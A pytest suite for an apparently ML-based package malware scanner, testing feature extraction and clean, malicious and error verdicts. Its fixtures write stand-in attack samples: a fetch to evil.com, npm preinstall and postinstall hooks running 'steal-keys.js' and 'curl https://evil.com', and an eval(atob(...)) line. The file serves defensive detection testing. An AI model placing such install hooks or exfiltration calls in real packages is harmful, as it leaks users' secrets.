"""Tests for the scanner service (ML classifier wrapper)."""

from __future__ import annotations

import json
import os
import tarfile
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import numpy as np
import pytest

from app.services.scanner_service import (
    ScanVerdict,
    _extract_features_from_directory,
    classify,
)


# ── Feature extraction ─────────────────────────────────────────────────

def test_extract_features_empty_dir():
    """An empty directory should produce a valid feature vector with zeros."""
    with tempfile.TemporaryDirectory(prefix="sentinel_test_") as td:
        features = _extract_features_from_directory(Path(td))
        assert features.shape[0] == 1  # single sample
        assert features.shape[1] > 0   # some features


def test_extract_features_detects_network_calls():
    """Files containing network indicators should set the flag."""
    with tempfile.TemporaryDirectory(prefix="sentinel_test_") as td:
        p = Path(td)
        (p / "index.js").write_text("const x = fetch('https://evil.com/data');")
        features = _extract_features_from_directory(p)
        assert features.shape[0] == 1


def test_extract_features_detects_install_scripts():
    """A package.json with preinstall/postinstall should be detected."""
    with tempfile.TemporaryDirectory(prefix="sentinel_test_") as td:
        p = Path(td)
        pkg = {
            "name": "evil-pkg",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "node steal-keys.js",
                "postinstall": "curl https://evil.com",
            },
        }
        (p / "package.json").write_text(json.dumps(pkg))
        (p / "steal-keys.js").write_text("process.env.SECRET")
        features = _extract_features_from_directory(p)
        assert features.shape[0] == 1


# ── classify() ─────────────────────────────────────────────────────────

def test_classify_returns_verdict_for_directory():
    """classify() on a directory should return a ScanVerdict with status and score."""
    mock_classifier = MagicMock()
    mock_classifier.predict_proba.return_value = np.array([[0.95, 0.05]])

    with (
        tempfile.TemporaryDirectory(prefix="sentinel_test_") as td,
        patch("app.services.scanner_service._classifier", mock_classifier),
        patch("app.services.scanner_service._threshold", 0.5),
    ):
        p = Path(td)
        (p / "index.js").write_text("console.log('hello');")

        verdict = classify(p)

    assert isinstance(verdict, ScanVerdict)
    assert verdict.malware_status == "clean"
    assert verdict.malware_score is not None
    assert verdict.malware_score < 0.5


def test_classify_malicious_above_threshold():
    """Packages scoring above the threshold should be flagged malicious."""
    mock_classifier = MagicMock()
    mock_classifier.predict_proba.return_value = np.array([[0.1, 0.9]])

    with (
        tempfile.TemporaryDirectory(prefix="sentinel_test_") as td,
        patch("app.services.scanner_service._classifier", mock_classifier),
        patch("app.services.scanner_service._threshold", 0.5),
    ):
        p = Path(td)
        (p / "index.js").write_text("eval(atob('...'))")

        verdict = classify(p)

    assert verdict.malware_status == "malicious"
    assert verdict.malware_score >= 0.5


def test_classify_from_archive():
    """classify() should handle .tgz archives by extracting them first."""
    mock_classifier = MagicMock()
    mock_classifier.predict_proba.return_value = np.array([[0.8, 0.2]])

    with tempfile.TemporaryDirectory(prefix="sentinel_test_") as td:
        p = Path(td)
        # Create a package directory, then tar it.
        pkg_dir = p / "package"
        pkg_dir.mkdir()
        (pkg_dir / "index.js").write_text("module.exports = {};")

        archive_path = p / "pkg-1.0.0.tgz"
        with tarfile.open(archive_path, "w:gz") as tar:
            tar.add(pkg_dir, arcname="package")

        with (
            patch("app.services.scanner_service._classifier", mock_classifier),
            patch("app.services.scanner_service._threshold", 0.5),
        ):
            verdict = classify(archive_path)

    assert verdict.malware_status == "clean"
    assert verdict.malware_score is not None


def test_classify_missing_artifact():
    """classify() on a non-existent path should return an error verdict."""
    with (
        patch("app.services.scanner_service._classifier", MagicMock()),
        patch("app.services.scanner_service._threshold", 0.5),
    ):
        verdict = classify(Path("/nonexistent/path/pkg.tgz"))

    assert verdict.malware_status == "error"
    assert verdict.error_message is not None


def test_classify_missing_model():
    """classify() should return error if the model file is missing."""
    with (
        patch("app.services.scanner_service._classifier", None),
        patch("app.services.scanner_service._threshold", None),
        patch("app.services.scanner_service.settings") as mock_settings,
    ):
        mock_settings.scanner_model_path = "/nonexistent/model.pkl"
        mock_settings.scanner_threshold_path = "/nonexistent/threshold.pkl"

        with tempfile.TemporaryDirectory(prefix="sentinel_test_") as td:
            verdict = classify(Path(td))

    assert verdict.malware_status == "error"
    assert "not found" in verdict.error_message.lower()
